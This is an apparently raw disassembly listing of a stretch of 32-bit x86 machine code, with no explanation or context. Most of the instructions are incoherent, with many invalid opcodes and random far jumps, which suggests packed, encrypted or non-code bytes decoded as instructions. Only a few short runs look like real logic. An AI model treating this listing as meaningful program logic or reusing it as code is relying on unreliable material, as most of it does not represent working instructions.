  41172c:	retf   
  41172d:	xor    al,BYTE PTR [eax-0x529f6a67]
  411733:	repz shl BYTE PTR [edi-0x79],0x43
  411738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411739:	jmp    0x7f0:0xd0f6a234
  411740:	out    dx,al
  411741:	jno    0x4117b8
  411743:	jmp    0xfe1e:0x1d208447
  41174a:	mov    ecx,gs
  41174c:	adc    al,0xc8
  41174e:	inc    ebx
  41174f:	xlat   BYTE PTR ds:[ebx]
  411750:	in     eax,dx
  411751:	or     al,0x72
  411753:	das    
  411754:	rol    DWORD PTR [edi+0x49508c0a],0x49
  41175b:	pushf  
  41175c:	ud1    edi,DWORD PTR [esp+edx*1]
  411760:	sbb    al,0xc
  411762:	push   es
  411763:	fwait
  411764:	(bad)  
  411765:	cmp    BYTE PTR [ebp+0x48],ah
  411768:	mov    edi,0x8c9054f4
  41176d:	fst    DWORD PTR [ecx+0x7c]
  411770:	inc    edx
  411771:	mov    bh,0x2b
  411773:	lea    ebx,ds:0xbdfd4de7
  411779:	fstp   QWORD PTR [ebp-0x5d]
  41177c:	lea    esi,[edx]
  41177e:	pop    eax
  41177f:	(bad)  
  411780:	outs   dx,BYTE PTR ds:[esi]
  411781:	addr16 in al,0x23
  411784:	retf   
  411785:	adc    ebx,DWORD PTR [edx+0x61]
  411788:	arpl   WORD PTR ds:0x4e9b5a3a,dx
  41178e:	mov    ah,0xbd
  411790:	inc    ecx
  411791:	sub    eax,0x636856ad
  411796:	lods   eax,DWORD PTR ds:[esi]
  411797:	out    0xda,al
  411799:	adc    ah,BYTE PTR [ecx]
  41179b:	pop    edi
  41179c:	shr    DWORD PTR [edi+0x5b],1
  41179f:	mov    edx,0xcbad978d
  4117a4:	imul   esp,DWORD PTR [edi+ebp*2+0x71b17c48],0x3e25f0cc
  4117af:	jo     0x4117dc
  4117b1:	out    0xed,eax
  4117b3:	mov    bl,0xc
  4117b5:	bound  ebp,QWORD PTR [esi]
  4117b7:	out    dx,eax
  4117b8:	sbb    edx,DWORD PTR [edx+esi*4]
  4117bb:	mov    ebx,0x162d2129
  4117c0:	pop    es
  4117c1:	aas    
  4117c2:	mov    esi,0x542d10ca
  4117c7:	daa    
  4117c8:	sub    cl,BYTE PTR [edi-0xa]
  4117cb:	add    BYTE PTR [esi],cl
  4117cd:	adc    bl,0x5b
  4117d0:	not    BYTE PTR [ecx-0x63370ba4]
  4117d6:	fwait
  4117d7:	outs   dx,DWORD PTR ds:[esi]
  4117d8:	cld    
  4117d9:	mov    bl,0xf3
  4117db:	cdq    
  4117dc:	or     BYTE PTR [ebp-0xf],ch
  4117df:	call   0x9d94440d
  4117e4:	ja     0x4117b0
  4117e6:	scas   al,BYTE PTR es:[edi]
  4117e7:	inc    edi
  4117e8:	adc    bl,ch
  4117ea:	fwait
  4117eb:	lods   eax,DWORD PTR ds:[esi]
  4117ec:	adc    DWORD PTR [esi+0x6e503af4],ecx
  4117f2:	int    0x2
  4117f4:	xor    al,0x24
  4117f6:	int    0xbb
  4117f8:	pushf  
  4117f9:	pusha  
  4117fa:	mov    edi,0x11d4d3d5
  4117ff:	inc    ebx
  411800:	jmp    0x411814
  411802:	adc    edi,DWORD PTR [edx-0x222b717f]
  411808:	ss add eax,0xb5ca6116
  41180e:	fdivrp st(7),st
  411810:	lds    edi,FWORD PTR [esi+ebp*2]
  411813:	(bad)  
  411814:	xor    BYTE PTR [eax+0x462e3920],dh
  41181a:	fdiv   QWORD PTR [esi]
  41181c:	mov    cl,0x59
  41181e:	xchg   BYTE PTR [edi-0x7757d223],bh
  411824:	xchg   dl,dl
  411826:	adc    eax,0x7836940b
  41182b:	xchg   edi,eax
  41182c:	sbb    BYTE PTR [edi],ah
  41182e:	or     DWORD PTR [ecx+ebp*8],edx
  411831:	sbb    ebx,0xffffffb4
  411834:	fiadd  DWORD PTR [ebp-0x80]
  411837:	adc    BYTE PTR [edi-0x38],dl
  41183a:	in     al,dx
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fd75,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fdfa,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fdf6,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0x11edfc17],dl
  41187c:	push   es
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118a7
  411886:	repnz out 0x2f,al
  411889:	sbb    esi,eax
  41188b:	jbe    0x4118af
  41188d:	sub    bh,cl
  41188f:	es loope 0x411842
  411892:	fwait
  411893:	cmp    DWORD PTR [edi+0x4fb2c59d],eax
  411899:	(bad)  
  41189a:	xchg   ecx,eax
  41189b:	aam    0x27
  41189d:	adc    dh,BYTE PTR [eax-0x4f]
  4118a0:	loopne 0x411865
  4118a2:	xchg   ebp,eax
  4118a3:	int3   
  4118a4:	sbb    edx,edx
  4118a6:	jecxz  0x411834
  4118a8:	cmp    ecx,DWORD PTR [edx]
  4118aa:	call   0x833352a4
  4118af:	ret    0xd62c
  4118b2:	push   0xffffffd3
  4118b4:	pop    edx
  4118b5:	xchg   ecx,edi
  4118b7:	push   eax
  4118b8:	push   esi
  4118b9:	mov    esp,0xdb6da775
  4118be:	cwde   
  4118bf:	mov    al,ds:0x69a59719
  4118c4:	lahf   
  4118c5:	daa    
  4118c6:	js     0x41187e
  4118c8:	push   ebp
  4118c9:	mov    dh,BYTE PTR [esp+eax*4+0x25a87139]
  4118d0:	(bad)  
  4118d1:	or     dl,BYTE PTR [ebx-0x4f]
  4118d4:	cmp    dh,BYTE PTR [edx]
  4118d6:	adc    cl,BYTE PTR ds:0x92656771
  4118dc:	call   0x45f2:0x4e2d9bcf
  4118e3:	(bad)  
  4118e4:	jno    0x41186f
  4118e6:	aad    0xaa
  4118e8:	jno    0x41195d
  4118ea:	adc    al,dl
  4118ec:	lock jle 0x41192c
  4118ef:	mov    cl,0x7b
  4118f1:	test   ebp,0x921d8e88
  4118f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118f8:	gs out 0x1,al
  4118fb:	(bad)  
  4118fd:	lea    esi,[ebx+0xe8584b2]
  411903:	arpl   WORD PTR [edx-0x16],si
  411906:	mov    ds:0xac956617,eax
  41190b:	(bad)  [ecx+0x69]
  41190e:	xchg   edx,eax
  41190f:	sub    al,0x71
  411911:	sbb    ebp,edi
  411913:	out    0xb5,eax
  411915:	aas    
  411916:	xor    BYTE PTR [edx],ch
  411918:	push   DWORD PTR [ebp-0x71]
  41191b:	push   ecx
  41191c:	loope  0x4118f6
  41191e:	xlat   BYTE PTR ds:[ebx]
  41191f:	sub    al,0xa5
  411921:	mov    bh,0xcf
  411923:	mov    BYTE PTR [ebp+0x3c],bl
  411926:	dec    esp
  411927:	cmc    
  411928:	lahf   
  411929:	adc    BYTE PTR [eax+0x322ccc49],al
  41192f:	pop    esi
  411930:	sbb    ecx,edx
  411932:	fidivr WORD PTR [esi-0x43]
  411935:	jbe    0x4118d8
  411937:	push   ss
  411938:	rcl    DWORD PTR [edi-0x77b82205],0xfa
  41193f:	pop    ebx
  411940:	push   edi
  411941:	xchg   BYTE PTR [eax+0xd],bl
  411944:	out    0xf7,eax
  411946:	(bad)  
  411947:	and    edi,DWORD PTR [ebx]
  411949:	or     al,BYTE PTR ds:0xd94ac11a
  41194f:	lock dec ebp
  411951:	shl    bh,cl
  411953:	stc    
  411954:	mov    ebp,0x9f7d1307
  411959:	dec    edi
  41195a:	mov    al,0x6c
  41195c:	mov    ss,WORD PTR [edi]
  41195e:	sub    BYTE PTR [edi-0x3fc5e4a6],al
  411964:	or     edi,ecx
  411966:	push   cs
  411967:	dec    ebp
  411968:	fistp  WORD PTR [eax+0x41]
  41196b:	aaa    
  41196c:	test   al,0xbe
  41196e:	cmp    dh,BYTE PTR [ebx-0x3390e9ff]
  411974:	lahf   
  411975:	cs jle 0x411956
  411978:	pop    ebx
  411979:	rol    BYTE PTR [ebx+0x6ca27c28],1
  41197f:	adc    al,BYTE PTR [esi]
  411981:	test   al,0xd8
  411983:	das    
  411984:	sub    ebx,DWORD PTR [ebx]
  411986:	xchg   ebp,eax
  411987:	in     eax,dx
  411988:	mov    cl,0xe7
  41198a:	push   edx
  41198b:	into   
  41198c:	data16 sub BYTE PTR [ebx+0x60bdc3c5],ch
  411993:	dec    bh
  411995:	inc    eax
  411996:	push   ecx
  411997:	add    DWORD PTR [esi+ecx*1-0x49179ea5],esi
  41199e:	mov    esi,0xe01d888e
  4119a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a4:	jge    0x411958
  4119a6:	adc    al,0x25
  4119a8:	into   
  4119a9:	mov    bh,0x9d
  4119ab:	adc    ebx,0x284ffb65
  4119b1:	mov    ds:0xf36e82da,al
  4119b6:	mov    bh,0xc2
  4119b8:	popf   
  4119b9:	sub    eax,0x92b44dd8
  4119be:	jle    0x411a2d
  4119c0:	xchg   edx,eax
  4119c1:	push   sp
  4119c3:	out    dx,al
  4119c4:	ss jmp 0x411960
  4119c7:	data16 add cl,dl
  4119ca:	ds stc 
  4119cc:	mov    al,0xcc
  4119ce:	mul    BYTE PTR [edx-0xf84347d]
  4119d4:	mov    dl,0x92
  4119d6:	lds    eax,FWORD PTR [ebx+0x6d]
  4119d9:	xor    BYTE PTR [ebx],ah
  4119db:	test   DWORD PTR [ecx],esp
  4119dd:	mov    ebx,0x832fc4ba
  4119e2:	inc    DWORD PTR [ecx-0xf]
  4119e5:	and    edi,0x9425c2d9
  4119eb:	and    BYTE PTR [eax-0x34],dh
  4119ee:	fistp  DWORD PTR [edi+edx*4-0x6f423fdc]
  4119f5:	jbe    0x411a28
  4119f7:	mov    BYTE PTR [eax-0x35df8778],cl
  4119fd:	dec    esp
  4119fe:	cmp    al,0xa6
  411a00:	push   es
  411a01:	nop
  411a02:	mov    edx,0xaf34f8f2
  411a07:	popf   
  411a08:	(bad)  
  411a09:	jp     0x411a7f
  411a0b:	add    al,0xae
  411a0d:	mov    ch,0x9f
  411a0f:	xor    edx,esi
  411a11:	push   ds
  411a12:	adc    DWORD PTR [ebp+edx*1+0x25c4daf0],0x85fbd7af
  411a1d:	xlat   BYTE PTR ds:[ebx]
  411a1e:	scas   al,BYTE PTR es:[edi]
  411a1f:	adc    ebp,DWORD PTR [edi+0x294966d8]
  411a25:	xor    eax,DWORD PTR [ebp+0x2a]
  411a28:	push   edi
  411a29:	dec    esi
  411a2a:	jecxz  0x411a4f
  411a2c:	or     bh,BYTE PTR [ebx]
  411a2e:	(bad)  
  411a30:	leave  
  411a31:	dec    ebx
  411a32:	xchg   ebp,eax
  411a33:	repnz sbb DWORD PTR [edx+0x68c599ba],esp
  411a3a:	dec    DWORD PTR [ebp-0x4f]
  411a3d:	xchg   ebp,eax
  411a3e:	aaa    
  411a3f:	add    DWORD PTR fs:[ecx+0x5f],0x2b
  411a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a45:	or     al,0xec
  411a47:	mov    DWORD PTR [ebp+0x15d32505],eax
  411a4d:	xchg   ecx,eax
  411a4e:	pop    ecx
  411a4f:	ds sub eax,0xf0605a7b
  411a55:	xlat   BYTE PTR ds:[ebx]
  411a56:	dec    esi
  411a57:	out    0xe3,eax
  411a59:	xor    al,0x2f
  411a5b:	cmp    ecx,DWORD PTR [eax]
  411a5d:	push   edi
  411a5e:	fs pusha 
  411a60:	jge    0x411a02
  411a62:	xchg   edi,eax
  411a63:	cmp    DWORD PTR ds:0x95c933fb,esi
  411a69:	mov    ds:0xadb85822,al
  411a6e:	jmp    0xc01c:0x45ed3b87
  411a75:	lock ret 0xfce3
  411a79:	xlat   BYTE PTR ds:[ebx]
  411a7a:	test   BYTE PTR [eax],bl
  411a7c:	test   BYTE PTR [eax-0x43],al
  411a7f:	and    al,0xbc
  411a81:	pop    ebp
  411a82:	adc    al,0x3a
  411a84:	(bad)  
  411a86:	sbb    eax,0x19ed6bce
  411a8b:	push   es
  411a8c:	stos   DWORD PTR es:[edi],eax
  411a8d:	pmulhuw mm5,QWORD PTR [eax*2+0x127fa57b]
  411a95:	les    eax,FWORD PTR [edi-0x30]
  411a98:	scas   al,BYTE PTR es:[edi]
  411a99:	int3   
  411a9a:	or     al,0x69
  411a9c:	pop    eax
  411a9d:	dec    ebp
  411a9e:	mov    DWORD PTR [edx+0x60],ebx
  411aa1:	sub    eax,0xaf5a7f88
  411aa6:	sti    
  411aa7:	(bad)  
  411aa8:	jmp    0x411ac8
  411aaa:	scas   eax,DWORD PTR es:[edi]
  411aab:	sub    DWORD PTR [edx+0x5],eax
  411aae:	push   ss
  411aaf:	test   DWORD PTR ds:0x174312ea,0xbce0343b
  411ab9:	xor    ah,BYTE PTR [edx+0x1d]
  411abc:	fstp   DWORD PTR [ebx+0x77]
  411abf:	xchg   esp,eax
  411ac0:	aam    0x90
  411ac2:	fdivr  QWORD PTR ds:0xe7f61cfe
  411ac8:	ins    BYTE PTR es:[edi],dx
  411ac9:	add    al,0xc
  411acb:	ret    0x860b
  411ace:	adc    BYTE PTR [edx],ah
  411ad0:	push   esp
  411ad1:	imul   ebp,DWORD PTR [esi+0x11],0xb8fdc232
  411ad8:	clc    
  411ad9:	mov    al,ds:0x1e32e219
  411ade:	ins    BYTE PTR es:[edi],dx
  411adf:	sbb    al,0xde
  411ae1:	dec    edi
  411ae2:	mov    edi,0x4cda2e6f
  411ae7:	dec    ebx
  411ae8:	mov    eax,ds:0x2d8ffff9
  411aed:	stos   DWORD PTR es:[edi],eax
  411aee:	repz out dx,eax
  411af0:	jmp    0x128c:0x55bf1ec6
  411af7:	push   cs
  411af8:	inc    eax
  411af9:	out    0x11,eax
  411afb:	add    eax,0xe1c4b3b0
  411b00:	inc    edi
  411b01:	push   ebp
  411b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b03:	sub    al,0x2
  411b05:	jge    0x411b81
  411b07:	(bad)  
  411b09:	inc    esp
  411b0a:	call   0x49be8dec
  411b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b10:	adc    BYTE PTR [eax*2-0x36cf1c3c],al
  411b17:	in     al,dx
  411b18:	ss hlt 
  411b1a:	xor    eax,0x1272dab
  411b1f:	mov    ebx,0xc12c7edc
  411b24:	xchg   ecx,eax
  411b25:	add    DWORD PTR [ebp+0x31],ecx
  411b28:	push   DWORD PTR [edx]
  411b2a:	jl     0x411b75
  411b2c:	and    dl,0x29
  411b2f:	or     bl,BYTE PTR [eax+0x7f]
  411b32:	xchg   ebx,eax
  411b33:	add    ch,dl
  411b35:	adc    ebx,DWORD PTR [esi+0x3f9d1cf0]
  411b3b:	pop    esp
  411b3c:	shl    dh,1
  411b3e:	gs loope 0x411bb8
  411b41:	(bad)  
  411b43:	mov    al,0x5c
  411b45:	sbb    al,0x66
  411b47:	jl     0x411b23
  411b49:	imul   esi,esi,0xa177b41d
  411b4f:	pop    ss
  411b50:	jb     0x411ad9
  411b52:	stos   DWORD PTR es:[edi],eax
  411b53:	sbb    BYTE PTR [ebx+0x6c0fc985],ch
  411b59:	loopne 0x411baf
  411b5b:	push   0x1e6c1548
  411b60:	xchg   edi,eax
  411b61:	sar    BYTE PTR [eax+0x24],1
  411b64:	and    eax,0x792a0797
  411b69:	or     bh,dh
  411b6b:	mov    ebp,0x66ddb331
  411b70:	es in  al,dx
  411b72:	cdq    
  411b73:	pusha  
  411b74:	inc    eax
  411b75:	push   0xffffffcd
  411b77:	mov    ebp,0xb5f66bfa
  411b7c:	mov    ah,0xac
  411b7e:	jne    0x411b7b
  411b80:	mov    edx,0x7e531e5
  411b85:	add    eax,0xc3b463ed
  411b8a:	xchg   BYTE PTR [ebp-0x683e5e42],dh
  411b90:	pusha  
  411b91:	out    0xaa,al
  411b93:	push   edx
  411b94:	and    edx,DWORD PTR [ecx+0x3b]
  411b97:	call   FWORD PTR [edi-0x79]
  411b9a:	test   eax,0xb30c83fb
  411b9f:	jnp    0x411be4
  411ba1:	push   ds
  411ba2:	cs pop ss
  411ba4:	stos   BYTE PTR es:[edi],al
  411ba5:	ror    DWORD PTR [edx+0x49f304e8],cl
  411bab:	popa   
  411bac:	inc    ebp
  411bad:	dec    edx
  411bae:	aaa    
  411baf:	loop   0x411bab
  411bb1:	(bad)
  411bb4:	in     eax,0xb6
  411bb6:	ins    BYTE PTR es:[edi],dx
  411bb7:	add    al,BYTE PTR [eax+0x44]
  411bba:	hlt    
  411bbb:	lahf   
  411bbc:	push   edi
  411bbd:	pop    es
  411bbe:	ja     0x411b70
  411bc0:	push   es
  411bc1:	xchg   edx,eax
  411bc2:	in     eax,0x40
  411bc4:	push   0xffffffcc
  411bc6:	lods   eax,DWORD PTR ds:[esi]
  411bc7:	push   ecx
  411bc8:	jmp    0x9162:0x12b35904
  411bcf:	loopne 0x411ba9
  411bd1:	mov    DWORD PTR [ecx-0x4a572826],edi
  411bd7:	std    
  411bd8:	fdivr  DWORD PTR [edi+0x57d1e2a]
  411bde:	inc    esp
  411bdf:	daa    
  411be0:	mov    esp,0x1b1cc871
  411be5:	mov    edx,0xce43ea2e
  411bea:	mov    eax,ds:0xeeadc1b9
  411bef:	outs   dx,DWORD PTR ds:[esi]
  411bf0:	fdiv   DWORD PTR [ebx+0x9]
  411bf3:	outs   dx,BYTE PTR ds:[esi]
  411bf4:	push   ds
  411bf5:	xor    al,0x33
  411bf7:	pop    edx
  411bf8:	ins    DWORD PTR es:[edi],dx
  411bf9:	adc    ch,cl
  411bfb:	and    DWORD PTR [ebx-0x76],esi
  411bfe:	fwait
  411bff:	dec    ebx
  411c00:	mov    ds:0x7c952167,eax
  411c05:	fmul   DWORD PTR [ecx+esi*4+0x52d2f95]
  411c0c:	xchg   DWORD PTR ds:0xad65c6fb,ebp
  411c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c13:	popf   
  411c14:	dec    esi
  411c15:	pusha  
  411c16:	pop    eax
  411c17:	ins    BYTE PTR es:[edi],dx
  411c18:	mov    esi,0xb7995eeb
  411c1d:	mov    ecx,0x3f32da82
  411c22:	iret   
  411c23:	xchg   edx,eax
  411c24:	dec    ecx
  411c25:	cmp    al,0x53
  411c27:	jae    0x411bb1
  411c29:	enter  0xe2d5,0x90
  411c2d:	shl    BYTE PTR [edx+0x3bbe5461],1
  411c33:	and    cl,BYTE PTR [esi-0x7a]
  411c36:	jp     0x411bbb
  411c38:	pusha  
  411c39:	add    edx,DWORD PTR [eax+ebx*2-0xd]
  411c3d:	or     al,0xa7
  411c3f:	(bad)  
  411c41:	push   ss
  411c42:	mov    esi,0x47d8588
  411c47:	xlat   BYTE PTR ds:[ebx]
  411c48:	(bad)  
  411c49:	fist   WORD PTR ds:0xd081015b
  411c4f:	jecxz  0x411c7b
  411c51:	dec    edi
  411c52:	inc    ecx
  411c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c54:	in     al,0xa3
  411c56:	or     esi,eax
  411c58:	lods   eax,DWORD PTR ds:[esi]
  411c59:	f2xm1  
  411c5b:	mov    bl,0x6b
  411c5d:	fbstp  TBYTE PTR ds:0x307a8009
  411c63:	inc    ecx
  411c64:	xor    dh,BYTE PTR [edx+0x27]
  411c67:	xchg   esp,eax
  411c68:	push   ss
  411c69:	push   ds
  411c6a:	int    0x24
  411c6c:	push   ecx
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xce7dec5e
  411cb8:	call   FWORD PTR [esi+0x53]
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411d2d
  411cc2:	dec    ebp
  411cc3:	mov    esp,0x5ec694b3
  411cc8:	xlat   BYTE PTR ds:[ebx]
  411cc9:	jle    0x411c57
  411ccb:	rol    BYTE PTR [esi],1
  411ccd:	xor    ebx,DWORD PTR [edi+0x65]
  411cd0:	xchg   edi,eax
  411cd1:	mov    eax,ds:0xf369b71b
  411cd6:	iret   
  411cd7:	xlat   BYTE PTR ds:[ebx]
  411cd8:	and    ebp,ebp
  411cda:	adc    DWORD PTR [eax+0x13bed489],edi
  411ce0:	mov    bh,0xf3
  411ce2:	sub    DWORD PTR [edx-0x17],esp
  411ce5:	dec    eax
  411ce6:	xchg   ebp,eax
  411ce7:	pop    edx
  411ce8:	out    dx,eax
  411ce9:	mov    esp,0x9ecb1784
  411cee:	stc    
  411cef:	repnz push ss
  411cf1:	adc    al,0xa4
  411cf4:	push   cs
  411cf5:	cwde   
  411cf6:	(bad)  
  411cf7:	pop    ss
  411cf8:	test   DWORD PTR [ebx+0x5797b385],0xf02e6d96
  411d02:	jmp    0x411d3e
  411d04:	pop    ebp
  411d05:	outs   dx,DWORD PTR ds:[esi]
  411d06:	mov    al,0xb1
  411d08:	leave  
  411d09:	xor    ch,cl
  411d0b:	shl    DWORD PTR [ebp+0x29ae0fbe],0x13
  411d12:	jno    0x411d7e
  411d14:	ror    BYTE PTR [esi-0x751a3c8b],1
  411d1a:	jmp    0x9c8c0ba2
  411d1f:	sbb    ecx,DWORD PTR [eax+0x38]
  411d22:	or     DWORD PTR [ebx+0x4f],ebp
  411d25:	mov    eax,0x63490076
  411d2a:	arpl   WORD PTR [edx],di
  411d2c:	jecxz  0x411d90
  411d2e:	push   esi
  411d2f:	xchg   ebp,eax
  411d30:	push   cs
  411d31:	retf   0x47cc
  411d34:	push   ecx
  411d35:	mov    ah,0xcd
  411d37:	mov    edi,0x43a1ef71
  411d3c:	jnp    0x411d20
  411d3e:	(bad)  
  411d3f:	push   eax
  411d40:	mov    eax,ds:0x5bcfa348
  411d45:	popa   
  411d46:	mov    ah,0xe1
  411d48:	dec    ecx
  411d49:	xor    eax,0xeabaad33
  411d4e:	jae    0x411cd6
  411d50:	push   esi
  411d51:	pop    es
  411d52:	cmp    DWORD PTR [ecx],edi
  411d54:	nop
  411d55:	mov    eax,0xe958bd02
  411d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d5b:	cmp    BYTE PTR [esi-0x4dd1c9fd],ah
  411d61:	and    bh,BYTE PTR [ecx-0x7f6ec44c]
  411d67:	inc    esi
  411d68:	or     eax,0xd7e45216
  411d6d:	mov    edx,0x466a5bce
  411d72:	push   edi
  411d73:	pop    edx
  411d74:	mov    edi,0xaa8102a4
  411d79:	je     0x411d30
  411d7b:	(bad)  
  411d7c:	mov    dh,0xd9
  411d7e:	xchg   DWORD PTR [edi-0x548822aa],ebx
  411d84:	call   0x758d8fa9
  411d89:	adc    ch,BYTE PTR ds:0x1327b17b
  411d8f:	mov    esi,0x72f5356
  411d94:	mov    dh,0xa2
  411d96:	es popf 
  411d98:	clc    
  411d99:	mov    ah,0x52
  411d9b:	ror    DWORD PTR [eax+edi*8+0x10],0x95
  411da0:	icebp  
  411da1:	js     0x411de4
  411da3:	pop    esi
  411da4:	jne    0x411d5a
  411da6:	xchg   esp,eax
  411da7:	push   ss
  411da8:	in     eax,dx
  411da9:	mov    edi,0x28c77c6
  411dae:	mov    dl,0x35
  411db0:	(bad)  
  411db1:	mov    bl,BYTE PTR [ebx-0x50]
  411db4:	loopne 0x411e04
  411db6:	jg     0x411dc0
  411db8:	mov    al,BYTE PTR [edx]
  411dba:	push   cs
  411dbb:	adc    ecx,DWORD PTR [edi]
  411dbd:	push   esi
  411dbe:	sub    BYTE PTR [edx+0x3b117836],ch
  411dc4:	nop
  411dc5:	nop
  411dc6:	mov    eax,ds:0x8cd7f649
  411dcb:	xor    ebx,DWORD PTR [esi-0x80]
  411dce:	mov    esi,0x2c675290
  411dd3:	clc    
  411dd4:	fs jg  0x411df5
  411dd7:	in     al,dx
  411dd8:	mov    bl,0xf3
  411dda:	hlt    
  411ddb:	ins    BYTE PTR es:[edi],dx
  411ddc:	loopne 0x411db7
  411dde:	(bad)  
  411ddf:	int3   
  411de0:	adc    DWORD PTR [esi+eax*1],ecx
  411de3:	and    DWORD PTR [edx-0x34],ecx
  411de6:	or     al,0x48
  411de8:	and    DWORD PTR [ebp-0x4aa29afc],edx
  411dee:	xchg   edi,eax
  411def:	sub    BYTE PTR [eax],ah
  411df1:	inc    edx
  411df2:	ins    BYTE PTR es:[edi],dx
  411df3:	test   BYTE PTR [esi+0x15],bl
  411df6:	or     BYTE PTR [edi-0x23],bl
  411df9:	dec    ecx
  411dfa:	mul    BYTE PTR [edx+0x7343406d]
  411e00:	fcmovnu st,st(2)
  411e02:	scas   eax,DWORD PTR es:[edi]
  411e03:	mov    al,ch
  411e05:	or     DWORD PTR [ebx+0x1a],0x1a
  411e09:	dec    esi
  411e0a:	adc    BYTE PTR [ebx],dh
  411e0c:	hlt    
  411e0d:	mov    ah,0x89
  411e0f:	dec    ebx
  411e10:	scas   al,BYTE PTR es:[edi]
  411e11:	cmp    BYTE PTR ss:[edx-0x70],ah
  411e15:	outs   dx,BYTE PTR ds:[esi]
  411e16:	push   ebp
  411e17:	mov    dl,BYTE PTR [ecx]
  411e19:	lea    eax,[esi+0x35]
  411e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e1d:	mov    dh,0xbb
  411e1f:	outs   dx,DWORD PTR ds:[esi]
  411e20:	rol    BYTE PTR [edx-0x517c620f],cl
  411e26:	fisttp WORD PTR [edx]
  411e28:	popf   
  411e29:	psllq  mm6,QWORD PTR [ecx]
  411e2c:	dec    ebx
  411e2d:	add    al,0x19
  411e2f:	pushf  
  411e30:	adc    esp,esp
  411e32:	arpl   WORD PTR [ebx+0x52],di
  411e35:	in     al,dx
  411e36:	mov    ds:0x5e8fbf64,al
  411e3b:	pop    es
  411e3c:	hlt    
  411e3d:	pop    esp
  411e3e:	(bad)  
  411e3f:	mov    dh,0xa9
  411e41:	jmp    0x411e70
  411e43:	jmp    0x411df8
  411e45:	mov    ecx,gs
  411e47:	test   BYTE PTR [eax-0x2f],0x1b
  411e4b:	jnp    0x411e94
  411e4d:	sbb    ah,ah
  411e4f:	iret   
  411e50:	pop    ecx
  411e51:	xchg   esp,eax
  411e52:	pop    ds
  411e53:	xchg   esi,eax
  411e54:	retf   
  411e55:	or     bl,al
  411e57:	pop    esp
  411e58:	clc    
  411e59:	into   
  411e5a:	push   ecx
  411e5b:	and    DWORD PTR [ebp+0x60397d57],eax
  411e61:	jle    0x411e48
  411e63:	lods   eax,DWORD PTR ds:[esi]
  411e64:	ror    BYTE PTR [ebx],1
  411e66:	mov    ebx,0x2f1ee5d7
  411e6b:	jmp    0x411e00
  411e6d:	fistp  WORD PTR [ebx-0x37]
  411e70:	adc    al,bh
  411e72:	out    0x81,eax
  411e74:	out    dx,al
  411e75:	or     BYTE PTR ds:0x149d7eff,ch
  411e7b:	js     0x411e5d
  411e7d:	in     eax,0x1e
  411e7f:	pop    ebx
  411e80:	xor    DWORD PTR [ecx+eiz*2+0x7b05d731],ebx
  411e87:	and    eax,0xa18115de
  411e8c:	pop    ss
  411e8d:	push   ebp
  411e8e:	push   cs
  411e8f:	scas   eax,DWORD PTR es:[edi]
  411e90:	das    
  411e91:	call   0x1f9f9c8
  411e96:	mov    edi,0xc5aef9f7
  411e9b:	ficom  DWORD PTR [ebx]
  411e9d:	inc    edi
  411e9e:	inc    ebx
  411e9f:	adc    bh,ah
  411ea1:	mov    ecx,0xd67c0105
  411ea6:	mov    ecx,DWORD PTR [edi+eax*8+0x3f]
  411eaa:	dec    esi
  411eab:	loope  0x411e82
  411ead:	cmp    dh,BYTE PTR ds:0xa5c33161
  411eb4:	enter  0xc62b,0x3
  411eb8:	sar    BYTE PTR [ecx+0x6e],1
  411ebb:	iret   
  411ebc:	xchg   edx,eax
  411ebd:	jge    0x411e56
  411ebf:	add    ebp,DWORD PTR [ebp-0x60]
  411ec2:	xor    ecx,DWORD PTR [ebx]
  411ec4:	fnstenv [esi]
  411ec6:	xchg   ebp,eax
  411ec7:	inc    eax
  411ec8:	mov    al,ds:0x434b48e2
  411ecd:	xchg   ebp,eax
  411ece:	cmp    esi,edi
  411ed0:	fwait
  411ed1:	mov    eax,ds:0xcc4c4674
  411ed6:	cwde   
  411ed7:	add    BYTE PTR [ecx+ebx*2+0x6e],cl
  411edb:	ret    
  411edc:	push   ds
  411edd:	jmp    FWORD PTR [edi+eax*4+0x273ec369]
  411ee4:	lock or eax,0xec091c6c
  411eea:	lock xchg edi,esi
  411eed:	mov    dl,0x37
  411eef:	inc    esi
  411ef0:	test   ch,ah
  411ef2:	rcl    DWORD PTR [edi-0x6b81982],1
  411ef8:	loopne 0x411f17
  411efa:	jg     0x411ee9
  411efc:	jnp    0x411f09
  411efe:	mov    edx,ecx
